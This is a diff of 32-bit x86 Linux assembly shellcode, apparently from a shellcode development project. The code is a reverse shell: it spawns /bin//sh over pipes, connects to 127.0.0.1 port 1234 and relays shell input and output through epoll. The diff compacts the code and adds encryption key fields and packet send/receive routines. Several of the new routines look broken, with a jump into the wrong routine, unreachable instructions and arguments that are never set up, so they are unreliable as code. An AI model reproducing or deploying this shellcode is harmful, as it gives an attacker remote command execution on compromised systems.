@@ -54,12 +54,29 @@
 %define EPOLL_CTL_DEL 2
 %define EPOLL_CTL_MOD 3
 
-%define SYS_SOCKET      1
-%define SYS_BIND        2  
-%define SYS_CONNECT     3 
+%define SYS_SOCKET      1   
+%define SYS_BIND        2   
+%define SYS_CONNECT     3   
+%define SYS_LISTEN      4   
+%define SYS_ACCEPT      5 
+%define SYS_GETSOCKNAME 6   
+%define SYS_GETPEERNAME 7   
+%define SYS_SOCKETPAIR  8   
+%define SYS_SEND        9   
+%define SYS_RECV       10 
+%define SYS_SENDTO     11   
+%define SYS_RECVFROM   12   
+%define SYS_SHUTDOWN   13   
+%define SYS_SETSOCKOPT 14 
+%define SYS_GETSOCKOPT 15   
+%define SYS_SENDMSG    16   
+%define SYS_RECVMSG    17     
+%define SYS_ACCEPT4    18   
+%define SYS_RECVMMSG   19 
+%define SYS_SENDMMSG   20 
 
-%define SIGCHLD	20
-%define BUFSIZ 256
+%define SIGCHLD 20
+%define BUFSIZ  64
 
 %define SHUT_RDWR     1
 
@@ -78,96 +95,105 @@ struc sc_prop
   evt   resd 1  
   evts  resb epoll_event_size
   buf   resb BUFSIZ
-  h     resd 1     
+  ekey  resb 16         ; encryption key
+  mkey  resb 16         ; mac key   
 endstruc
+ 
+    %ifndef BIN
+      global main
+      global _main
+    %endif     
          
     bits 32
     
-start:    
+main:    
+_main:    
       pushad
       sub    esp, sc_prop_size
+      mov    edi, esp
       mov    ebp, esp
       
+      ; create read/write pipes
+      push   2
+      pop    ecx
+c_pipe:      
       ; pipe(in);
-      lea    ebx, [ebp+p_in]
-      mov    eax, SYS_pipe
-      int    0x80
-      
       ; pipe(out);
-      lea    ebx, [ebp+p_out]
-      mov    eax, SYS_pipe
-      int    0x80
+      push   SYS_pipe
+      pop    eax
+      mov    ebx, edi             ; ebx = p_in      
+      int    0x80      
+      scasd
+      scasd
+      loop   c_pipe    
       
       ; pid = fork();
-      mov    eax, SYS_fork
+      push   SYS_fork
+      pop    eax
       int    0x80    
-      mov    [ebp+pid], eax
+      stosd                       ; save pid
       test   eax, eax
-      jz     connect
-      
-      ; dup2(p.in[0], STDIN_FILENO);
-      mov    ecx, STDIN_FILENO
-      mov    ebx, [ebp+p_in]
-      mov    eax, SYS_dup2
-      int    0x80    
-      
-      ; dup2(p.out[1], STDOUT_FILENO);
-      mov    ecx, STDOUT_FILENO    
+      jz     c_con
+
+      ; in this order..
+      ;
+      ; dup2 (out[1], STDERR_FILENO)      
+      ; dup2 (out[1], STDOUT_FILENO)
+      ; dup2 (in[0], STDIN_FILENO)   
+      mov    cl, 2
       mov    ebx, [ebp+p_out+4]
-      mov    eax, SYS_dup2      
-      int    0x80      
+c_dup:
+      mov    al, SYS_dup2
+      int    0x80 
+      dec    ecx
+      cmove  ebx, [ebp+p_in]
+      jns    c_dup  
+  
+      ; in this order..
+      ;
+      ; close(in[0]);
+      ; close(in[1]);
+      ; close(out[0]);
+      ; close(out[1]);
+      mov    esi, ebp
+      push   4
+      pop    ecx      
+cls_pipes:
+      lodsd
+      xchg   eax, ebx      
+      push   SYS_close
+      pop    eax 
+      int    0x80
+      loop   cls_pipes      
       
-      ; dup2(p.out[1], STDERR_FILENO);
-      mov    ecx, STDERR_FILENO    
-      mov    ebx, [ebp+p_out+4]
-      mov    eax, SYS_dup2      
-      int    0x80     
-      
-      ; close(p.in[0]);
-      mov    eax, SYS_close
-      mov    ebx, [ebp+p_in]    
-      int    0x80   
-      
-      ; close(p.in[1]);
-      mov    eax, SYS_close  
-      mov    ebx, [ebp+p_in+4]    
-      int    0x80    
-
-      ; close(p.out[0]);
-      mov    eax, SYS_close 
-      mov    ebx, [ebp+p_out]    
-      int    0x80    
-
-      ; close(p.out[1]);    
-      mov    eax, SYS_close
-      mov    ebx, [ebp+p_out+4]    
-      int    0x80       
-
       ; execve("/bin//sh", 0, 0);
-      mov    eax, SYS_execve
+      push   SYS_execve
+      pop    eax
       cdq
-      xor    ecx, ecx
       push   ecx
       push   '//sh'
       push   '/bin'
       mov    ebx, esp
       int    0x80
-connect:    
+c_con:    
       ; close(p.in[0]);
-      mov    eax, SYS_close
+      push   SYS_close
+      pop    eax
       mov    ebx, [ebp+p_in]    
       int    0x80    
 
       ; close(p.out[1]);
-      mov    eax, SYS_close  
+      push   SYS_close
+      pop    eax      
       mov    ebx, [ebp+p_out+4]    
       int    0x80   
       
-      ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);    
-      xor    ebx, ebx          ; ebx=0
-      mul    ebx               ; eax=0, edx=0
-      mov    al, SYS_socketcall
-      inc    ebx               ; ebx      = sys_socket
+      ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+      push   SYS_socketcall
+      pop    eax      
+      push   SYS_SOCKET
+      pop    ebx
+      cdq
       push   edx               ; protocol = IPPROTO_IP
       push   ebx               ; type     = SOCK_STREAM
       push   2                 ; family   = AF_INET
@@ -175,36 +201,59 @@ connect:
       int    0x80
       mov    [ebp+s], eax
 
+      push   0x0100007f        ; sa.sin_addr=127.0.0.1
+      push   0xD2040002        ; sa.sin_port=htons(1234), sa.sin_family=AF_INET
+      mov    ecx, esp
+      
+      ; connect (s, &sa, sizeof(sa));    
+      push   0x10              ; sizeof(sa)      
+      push   ecx               ; &sa
+      push   ebx               ; sockfd
+      mov    ecx, esp          ; &args
+      push   SYS_CONNECT
+      pop    ebx               ; ebx=SYS_CONNECT
+      push   SYS_socketcall
+      pop    eax
+      int    0x80      
+      
       ; efd = epoll_create1(0);
-      mov    eax, SYS_epoll_create1
+      push   SYS_epoll_create1
+      pop    eax
       xor    ebx, ebx
       int    0x80
       mov    [ebp+efd], eax
       
       test   eax, eax
       jle    shutdown
+      mov    ebx, [ebp+s]
+      clc      
 poll_init:
-      ; epoll_ctl(efd, EPOLL_CTL_ADD, h[i], &evts[0]); 
-      mov    eax, SYS_epoll_ctl
+      ; epoll_ctl(efd, EPOLL_CTL_ADD, i==0 ? s : out[0], &evts[0]);
+      lea    edi, [ebp+evts]
+      mov    esi, edi
+      push   EPOLLIN
+      pop    eax             ; evts[0].events = EPOLLIN
+      stosd
+      xchg   ebx, eax
+      stosd                  ; evts[0].data.fd = i==0 ? s : out[0]
+      xchg   edx, eax
+      push   SYS_epoll_ctl
+      pop    eax      
       mov    ebx, [ebp+efd]
-      mov    ecx, EPOLL_CTL_ADD
-      mov    edx, [ebp+s]
-      lea    esi, [ebp+evt]
-      int    0x80 
-
-      ; epoll_ctl(efd, EPOLL_CTL_ADD, h[i], &evts[0]);      
-      mov    eax, SYS_epoll_ctl
-      mov    ebx, [ebp+efd]
-      mov    ecx, EPOLL_CTL_ADD
-      mov    edx, [ebp+s]
-      lea    esi, [ebp+evt]
-      int    0x80       
+      push   EPOLL_CTL_ADD
+      pop    ecx
+      int    0x80
+      mov    ebx, [ebp+p_out+4]   ; do out[0] next      
+      cmc
+      jc    poll_init      
 poll_wait:
       ; epoll_wait(efd, evts, 1, -1);
-      mov    eax, SYS_epoll_wait
+      push   SYS_epoll_wait
+      pop    eax
       mov    ebx, [ebp+efd]
       lea    ecx, [ebp+evts]
-      mov    edx, 1
+      push   1
+      pop    edx
       or     esi, -1
       int    0x80
       
@@ -213,7 +262,7 @@ poll_wait:
       jle    close_efd
       
       ; if (!(evt & EPOLLIN)) break;
-      test   eax, EPOLLIN
+      test   al, EPOLLIN
       jnz    close_efd
       
       ; if (fd == s)
@@ -221,7 +270,8 @@ poll_wait:
       jne    read_stdout
       
       ; len = read(s, buf, BUFSIZ);
-      mov    eax, SYS_read
+      push   SYS_read
+      pop    eax
       mov    ebx, [ebp+s]
       lea    ecx, [ebp+buf]
       mov    edx, BUFSIZ
@@ -229,14 +279,16 @@ poll_wait:
       mov    [ebp+len], eax
       
       ; write(in[1], buf, len);
-      mov    eax, SYS_write
+      push   SYS_write
+      pop    eax
       mov    ebx, [ebp+p_in+4]
       mov    ecx, [ebp+len]
       int    0x80
       jmp    poll_wait      
 read_stdout:
       ; len = read(out[0], buf, BUFSIZ);
-      mov    eax, SYS_read
+      push   SYS_read
+      pop    eax
       mov    ebx, [ebp+p_out]
       lea    ecx, [ebp+buf]
       mov    edx, BUFSIZ
@@ -244,60 +296,169 @@ read_stdout:
       mov    [ebp+len], eax
       
       ; write(s, buf, len);
-      mov    eax, SYS_write
+      push   SYS_write
+      pop    eax
       mov    ebx, [ebp+s]
       mov    ecx, [ebp+len]
       int    0x80
       jmp    poll_wait
 close_efd:
       ; epoll_ctl(efd, EPOLL_CTL_DEL, h[i], NULL);
-      mov    eax, SYS_epoll_ctl
+      push   SYS_epoll_ctl
+      pop    eax
       mov    ebx, [ebp+efd]
-      mov    ecx, EPOLL_CTL_DEL
-      mov    edx, [ebp+h]
+      push   EPOLL_CTL_DEL
+      pop    ecx
+      mov    edx, [ebp+s]
       xor    esi, esi
       int    0x80  
 
       ; epoll_ctl(efd, EPOLL_CTL_DEL, h[i], NULL);      
-      mov    eax, SYS_epoll_ctl
+      push   SYS_epoll_ctl
+      pop    eax 
       mov    ebx, [ebp+efd]
-      mov    ecx, EPOLL_CTL_DEL
-      mov    edx, [ebp+h]
+      push   EPOLL_CTL_DEL
+      pop    ecx
+      mov    edx, [ebp+p_out+4]
       xor    esi, esi
       int    0x80       
 shutdown:
       ; kill(pid, SIGCHLD);
-      mov    eax, SYS_kill
+      push   SYS_kill
+      pop    eax
       mov    ebx, [ebp+pid]
-      mov    ecx, SIGCHLD
+      push   SIGCHLD
+      pop    ecx
       int    0x80
 
       ; shutdown(s, SHUT_RDWR);
-      mov    eax, SYS_shutdown
+      push   SYS_shutdown
+      pop    eax
       mov    ebx, [ebp+s]
-      mov    ecx, SHUT_RDWR
+      push   SHUT_RDWR
+      pop    ecx
       int    0x80
 
       ; close(s);
-      mov    eax, SYS_close
+      push   SYS_close
+      pop    eax
       mov    ebx, [ebp+s]
       int    0x80
 close_pipes:
       ; close(in[1]);
+      push   SYS_close
+      pop    eax      
       mov    ebx, [ebp+p_in+4]
-      mov    eax, SYS_close
       int    0x80
 
       ; close(out[0]);    
+      push   SYS_close
+      pop    eax      
       mov    ebx, [ebp+p_out]
-      mov    eax, SYS_close
       int    0x80    
 exit:
       ; exit(0);
-      mov    eax, SYS_exit
+      push   SYS_exit
+      pop    eax 
       int    0x80    
       
       add    esp, sc_prop_size
       popad
       ret    
+      
+; ***********************************
+;
+; send packet, fragmented if required
+;
+; ***********************************
+send_pkt:
+      pushad
+      ; 1. wrap
+      stc
+      call   encrypt      
+      ; 2. send
+c_send:
+      xor    eax, eax
+      push   eax
+      mov    al, BUFSIZ
+      push   eax
+      lea    ecx, [ebp+buf]
+      push   ecx
+      push   dword[ebp+s]
+      mov    ecx, esp      
+      push   SYS_SEND
+      pop    ebx
+      push   SYS_socketcall
+      pop    eax      
+      int    0x80
+      add    esp, 4*4
+      test   eax, eax
+      jle    exit_rpkt
+      add    ebp, eax
+      jmp    r_pkt         
+      jg     c_send      
+      popad
+      ret
+; ***********************************
+;
+; send data, encrypted if required
+;
+; ***********************************      
+spp_send:
+      pushad
+      ; 1. send length of data
+      call   send_pkt
+      jle    exit_send      
+      ; 2. send the data
+      call   send_pkt      
+exit_send      
+      popad
+      ret
+; ***********************************
+;
+; receive packet, fragmented if required
+;
+; ***********************************
+recv_pkt:
+      pushad     
+      ; 1. receive
+      mov    ecx, esp      
+r_pkt:
+      push   SYS_RECV
+      pop    ebx
+      push   SYS_socketcall
+      pop    eax      
+      int    0x80
+      add    esp, 4*4
+      test   eax, eax
+      jle    exit_rpkt
+      add    ebp, eax
+      jmp    r_pkt
+      ; 2. unwrap
+      clc
+      call   encrypt
+      test   eax, eax
+exit_rpkt:      
+      mov    [esp+_eax], eax
+      popad
+      ret
+; ***********************************
+;
+; receive data, decrypt if required
+;
+; ***********************************      
+spp_recv:
+      pushad
+      ; 1. receive the length
+      call   recv_pkt
+      jle    exit_recv      
+      ; 2. receive the data
+      call   recv_pkt
+exit_recv:      
+      popad
+      ret
+      
+%include "mx.asm"
+%include "rnx.asm"
+%include "cpx.asm"
       
